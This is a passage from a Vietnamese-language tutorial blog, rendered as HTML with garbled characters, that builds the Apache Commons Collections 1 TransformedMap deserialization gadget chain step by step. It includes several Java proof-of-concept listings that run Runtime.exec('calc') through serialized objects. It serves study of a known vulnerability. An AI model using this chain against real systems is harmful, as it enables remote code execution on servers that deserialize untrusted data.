class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">// TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i Method method = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiáº¿p theo lÃ  invoke biáº¿n <code>getRuntimeMethod</code> Ä‘á»ƒ táº¡o Runtime object. Rá»“i thá»±c hiá»‡n invoke method exec cá»§a object runtime má»›i táº¡o ra. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">//TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i Runtime runtime = (Runtime) method.invoke(null);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) InvokerRuntime.transform(getRuntimeMethod);</span><br><span class="line">        <span class="comment">//TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i exec.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerExec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        InvokerExec.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Äá»ƒ Ã½ á»Ÿ pháº§n trÃªn chÃºng ta cÃ³ cÃ¡c InvokerTransformer ná»‘i tiáº¿p nhau, Ä‘á»ƒ thuáº­n tiá»‡n hÆ¡n ngÆ°á»i ta Ä‘Ã£ cÃ³ táº¡o ra má»™t lá»›p lÃ  ChainedTransformer, nÃ³ cÅ©ng thá»±c hiá»‡n nhÆ° InvokerTransformer tuy nhiÃªn Ä‘iá»ƒm khÃ¡c lÃ  nÃ³ sáº½ thá»±c thi theo má»™t chuá»—i gáº¯n káº¿t vá»›i nhau. ChÃºng ta sáº½ lá»£i dá»¥ng hÃ m nÃ y Ä‘á»ƒ thá»±c thi tÆ°Æ¡ng tá»± nhÆ° trÃªn.</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ChainedTransformed.png"></p><p>Viáº¿t tiáº¿p chain theo ChainedTranformer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Káº¿t há»£p vá»›i TransformedMap chÃºng ta cÃ³ chuá»—i hoÃ n chá»‰nh sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Giai-quyet-van-de-cau-lenh-if"><a href="#Giai-quyet-van-de-cau-lenh-if" class="headerlink" title="Giáº£i quyáº¿t váº¥n Ä‘á» cÃ¢u lá»‡nh if"></a>Giáº£i quyáº¿t váº¥n Ä‘á» cÃ¢u lá»‡nh if</h3><p>Äáº¿n Ä‘Ã¢y chÃºng ta váº«n chÆ°a giáº£i quyáº¿t váº¥n Ä‘á» AnnotationInvocationHandler.readObject sá»­ dá»¥ng hÃ m setValue. Äáº¿n Ä‘Ã¢y cÃ¡c báº¡n nÃªn debug Ä‘á»ƒ xá»­ lÃ½ dá»… dÃ ng hÆ¡n nhÃ©.</p><p>Äáº·t breakpoint á»Ÿ dÃ²ng 339 vÃ  341.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/debug-readObject.png"></p><p>ChÃºng ta cáº§n var7 lÃ  má»™t giÃ¡ trá»‹ khÃ´ng null.</p><ul><li><code>Map var3 = var2.memberTypes()</code>, var2 lÃ  má»™t Object kiá»ƒu AnnotationType cá»§a lá»›p káº¿ thá»«a Annotation mÃ  ta truyá»n vÃ o á»Ÿ Ä‘oáº¡n <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code>. </li><li><code>var2 = AnnotationType.getInstance(this.type)</code>: var2 lÃ  má»™t Object kiá»ƒu AnnotationType cá»§a lá»›p káº¿ thá»«a Annotation mÃ  ta truyá»n vÃ o á»Ÿ Ä‘oáº¡n <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code></li><li>Code gá»‘c khÃ¡ lÃ  khÃ³ hiá»ƒu nÃªn cÃ¡c báº¡n cá»© hiá»ƒu Ä‘Æ¡n giáº£n lÃ  trong AnnotationType cÃ³ biáº¿n lÃ  memberTypes lÃ  má»™t map vá»›i key lÃ  tÃªn cá»§a biáº¿n trong <code>Override.class</code> mÃ¬nh cho vÃ o, vÃ  value lÃ  kiá»ƒu cá»§a biáº¿n nÃ y. Ta gá»i <code>var2.memberTypes()</code> sáº½ tráº£ vá» map nÃ y.<br>Váº­y lÃ  lá»—i á»Ÿ Ä‘Ã¢y xáº£y ra do interface Override khÃ´ng cÃ³ biáº¿n nÃ o cáº£. ChÃºng ta cáº§n tÃ¬m Annotation khÃ¡c cÃ³ biáº¿n, á»Ÿ Ä‘Ã¢y chÃºng ta cÃ³ annotation Target cÃ³ má»™t biáº¿n. VÃ  Ä‘áº·t láº¡i giÃ¡ trá»‹ trong map lÃ  <code>key=value</code> vÃ  <code>value=báº¥t ká»³</code>:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;testtt&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/var7-setOk.png"></p><p>ChÃºng ta Ä‘Ã£ vÆ°á»£t qua Ä‘Æ°á»£c if Ä‘áº§u tiÃªn, vÃ  Ä‘á»“ng thá»i if thá»© 2 cÅ©ng Ä‘Ã£ vÆ°á»£t qua (khÃ´ng cáº§n Ä‘á»ƒ Ã½ Ä‘áº¿n vÃ¬ toÃ n code gá»‘c, Ä‘á»c vÃ o sáº½ tá»‘n thá»i gian cá»§a chÃºng ta thui Ã ). Tuy nhiÃªn váº«n chÆ°a Ä‘á»§ Ä‘á»ƒ exec calc bá»Ÿi vÃ¬ chÃºng ta chÆ°a xá»­ lÃ½ váº¥n Ä‘á» khÃ´ng Ä‘iá»u khiá»ƒn Ä‘Æ°á»£c <code>AnnotationTypeMismatchExceptionProxy</code>.</p><h3 id="Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy"><a href="#Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy" class="headerlink" title="Giáº£i quyáº¿t váº¥n Ä‘á» khÃ´ng Ä‘iá»u khiá»ƒn Ä‘Æ°á»£c AnnotationTypeMismatchExceptionProxy"></a>Giáº£i quyáº¿t váº¥n Ä‘á» khÃ´ng Ä‘iá»u khiá»ƒn Ä‘Æ°á»£c AnnotationTypeMismatchExceptionProxy</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ConstantTransformer.png"></p><p>Äáº¿n Ä‘Ã¢y má»i thá»© Ä‘Æ°á»£c láº­p trÃ¬nh ra váº«n há»— trá»£ cho chain cá»§a chÃºng ta :), lá»›p <code>ConstantTransformer</code> tÆ°Æ¡ng tá»± nhÆ° InvokerTransformer tuy nhiÃªn khi thá»±c hiá»‡n transform, tháº±ng <code>ConstantTransformer</code> sáº½ trá»±c tiáº¿p return ra Object mÃ¬nh truyá»n vÃ o á»Ÿ hÃ m táº¡o chá»© khÃ´ng pháº£i Object truyá»n vÃ o á»Ÿ hÃ m Transform, Object nÃ y sáº½ ná»‘i tiáº¿p cho chuá»—i sau.<br>Váº­y lÃ  chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n <code>x.Transform(new AnnotationTypeMismatchExceptionProxy....)</code></p><p>Tá»« Ä‘Ã¢y chÃºng ta cÃ³ chuá»—i hoÃ n chá»‰nh sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test-value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">   